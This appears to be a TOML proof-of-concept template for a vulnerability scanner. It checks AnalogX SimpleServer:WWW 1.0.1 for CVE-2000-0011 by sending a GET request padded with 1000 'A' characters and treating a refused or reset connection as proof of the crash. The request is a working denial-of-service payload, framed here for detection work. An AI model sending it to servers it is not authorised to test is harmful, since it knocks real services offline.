[info]
author = "AVE"
description = "检测 AnalogX SimpleServer:WWW 1.0.1 缓冲区溢出漏洞，通过发送超长 GET 请求（>1000 字节）触发服务崩溃，验证漏洞存在性"
id = "POC-AVE-2000-0022"
name = "AnalogX SimpleServer:WWW 1.0.1 GET Buffer Overflow PoC"
severity = "high"
tags = [
    "cve-2000-0011",
    "buffer-overflow",
    "dos",
]
vuln_id = [
    "CVE-2000-0011",
    "AVE-2000-0022",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/{{repeat('A', 1000)}}HTTP/1.1"
protocol = "http"

[poc.requests.headers]
Connection = "close"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Connection refused",
    "connection refused",
    "No route to host",
    "reset by peer",
    "timeout",
]
